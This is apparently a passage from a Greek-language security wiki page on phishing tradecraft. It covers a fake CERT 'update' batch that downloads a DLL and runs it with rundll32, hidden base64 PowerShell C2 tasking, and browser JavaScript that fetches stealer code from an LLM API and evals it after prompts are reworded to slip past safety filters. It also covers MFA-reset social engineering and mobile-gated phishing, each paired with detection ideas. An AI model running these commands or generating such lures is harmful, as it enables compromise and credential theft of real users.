- Αν απαντάτε σε μία από αυτές τις αλυσίδες, διατηρήστε **network + memory από το πρώτο επιτυχημένο run**: τα μεταγενέστερα replays μπορεί να δείχνουν μόνο μια καλοπροαίρετη διαδρομή installer/SFX ή να αποτυγχάνουν επειδή το payload/key release ήταν δεμένο με το αρχικό TDS session.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Δόλωμα: κλωνοποιημένη εθνική CERT advisory με ένα κουμπί **Update** που εμφανίζει βήμα-βήμα οδηγίες “fix”. Στα θύματα λένε να τρέξουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.
* Τυπική αλυσίδα batch που παρατηρήθηκε:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* Το `Invoke-WebRequest` ρίχνει το payload στο `%TEMP%`, ένα σύντομο sleep κρύβει το network jitter, και μετά το `rundll32` καλεί το exported entrypoint (`notepad`).
* Το DLL beacons host identity και κάνει poll το C2 κάθε λίγα λεπτά. Το remote tasking έρχεται ως **base64-encoded PowerShell** και εκτελείται hidden με policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάζει tasks χωρίς να ενημερώνει το DLL) και κρύβει τα console windows. Αναζητήστε παιδιά του PowerShell από `rundll32.exe` χρησιμοποιώντας μαζί `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Οι defenders μπορούν να ψάξουν για HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και 5-minute polling intervals μετά το DLL load.

---

## AI-Enhanced Phishing Operations
Οι attackers τώρα αλυσσιδώνουν **LLM & voice-clone APIs** για πλήρως εξατομικευμένα lures και real-time αλληλεπίδραση.

| Layer | Παράδειγμα χρήσης από threat actor |
|-------|-----------------------------------|
|Automation|Generate & send >100 k emails / SMS με τυχαιοποιημένη διατύπωση & tracking links.|
|Generative AI|Produce *one-off* emails που αναφέρονται σε δημόσιο M&A, inside jokes από social media· deep-fake CEO voice σε callback scam.|
|Agentic AI|Αυτόματα register domains, scrape open-source intel, craft next-stage mails όταν ένα θύμα κάνει click αλλά δεν υποβάλλει creds.|

**Defence:**
• Προσθέστε **dynamic banners** που επισημαίνουν μηνύματα που στάλθηκαν από untrusted automation (μέσω ARC/DKIM anomalies).
• Εφαρμόστε **voice-biometric challenge phrases** για υψηλού ρίσκου phone requests.
• Προσομοιώνετε συνεχώς AI-generated lures σε awareness programmes – τα static templates είναι obsolete.

Δείτε επίσης – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Δείτε επίσης – AI agent abuse of local CLI tools and MCP (για secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Οι attackers μπορούν να στέλνουν HTML που φαίνεται καλοπροαίρετο και να **generate το stealer στο runtime** ζητώντας από ένα **trusted LLM API** JavaScript, και μετά εκτελώντας το in-browser (π.χ. `eval` ή dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode URLs exfil/Base64 strings στο prompt· τροποποιήστε τη διατύπωση για να παρακάμψετε safety filters και να μειώσετε hallucinations.
2. **Client-side API call:** στο load, το JS καλεί ένα public LLM (Gemini/DeepSeek/etc.) ή ένα CDN proxy· μόνο το prompt/API call υπάρχει στο static HTML.
3. **Assemble & exec:** κάντε concatenate το response και εκτελέστε το (polymorphic ανά επίσκεψη):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** το generated code προσωποποιεί το lure (π.χ. LogoKit token parsing) και στέλνει creds στο prompt-hidden endpoint.

**Evasion traits**
- Η traffic χτυπά γνωστά LLM domains ή αξιόπιστα CDN proxies· μερικές φορές μέσω WebSockets προς backend.
- Δεν υπάρχει static payload· το malicious JS υπάρχει μόνο μετά το render.
- Μη ντετερμινιστικά generations παράγουν **unique** stealers ανά session.

**Detection ideas**
- Τρέξτε sandboxes με ενεργοποιημένο JS· επισημάνετε **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Αναζητήστε front-end POSTs προς LLM APIs αμέσως ακολουθούμενα από `eval`/`Function` στο returned text.
- Alert σε unsanctioned LLM domains στην client traffic μαζί με subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Εκτός από το κλασικό push-bombing, οι operators απλώς **force a new MFA registration** κατά τη διάρκεια του help-desk call, ακυρώνοντας το existing token του χρήστη.  Κάθε επόμενο login prompt φαίνεται legitimate στο θύμα.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Παρακολουθήστε για events σε AzureAD/AWS/Okta όπου **`deleteMFA` + `addMFA`** συμβαίνουν **μέσα σε λίγα λεπτά από το ίδιο IP**.



## Clipboard Hijacking / Pastejacking

Οι attackers μπορούν να αντιγράφουν σιωπηλά malicious commands στο clipboard του victim από ένα compromised ή typosquatted web page και στη συνέχεια να τον εξαπατούν ώστε να τα κάνει paste μέσα σε **Win + R**, **Win + X** ή ένα terminal window, εκτελώντας arbitrary code χωρίς κανένα download ή attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Μια lure page (π.χ. fake ministry/CERT “channel”) εμφανίζει ένα WhatsApp Web/Desktop QR και δίνει οδηγίες στο victim να το σαρώσει, προσθέτοντας αθόρυβα τον attacker ως **linked device**.
* Ο attacker αποκτά αμέσως ορατότητα σε chat/contact μέχρι να αφαιρεθεί η session. Τα victims μπορεί αργότερα να δουν μια ειδοποίηση “new device linked”; οι defenders μπορούν να hunt for unexpected device-link events αμέσως μετά από επισκέψεις σε untrusted QR pages.

### Mobile‑gated phishing to evade crawlers/sandboxes
Οι operators όλο και περισσότερο βάζουν τα phishing flows τους πίσω από έναν απλό device check, ώστε desktop crawlers να μη φτάνουν ποτέ στις τελικές pages. Ένα συνηθισμένο pattern είναι ένα μικρό script που ελέγχει για touch-capable DOM και στέλνει το αποτέλεσμα σε ένα server endpoint· οι non‑mobile clients λαμβάνουν HTTP 500 (ή μια blank page), ενώ οι mobile users λαμβάνουν το πλήρες flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
Λογική του `detect_device.js` (απλοποιημένη):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Συμπεριφορά διακομιστή που παρατηρείται συχνά:
- Ορίζει ένα session cookie κατά το πρώτο load.
- Δέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) σε επόμενα GETs όταν `is_mobile=false`; σερβίρει phishing μόνο αν είναι `true`.

Heuristics για hunting και detection:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για non-mobile; legitimate mobile victim paths επιστρέφουν 200 με follow-on HTML/JS.
- Block ή scrutinize σελίδες που condition το content αποκλειστικά σε `ontouchstart` ή παρόμοιους device checks.

Συμβουλές άμυνας:
- Εκτελέστε crawlers με mobile-like fingerprints και JS enabled για να αποκαλυφθεί gated content.
- Ειδοποιήστε για ύποπτες 500 responses μετά από `POST /detect` σε newly registered domains.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
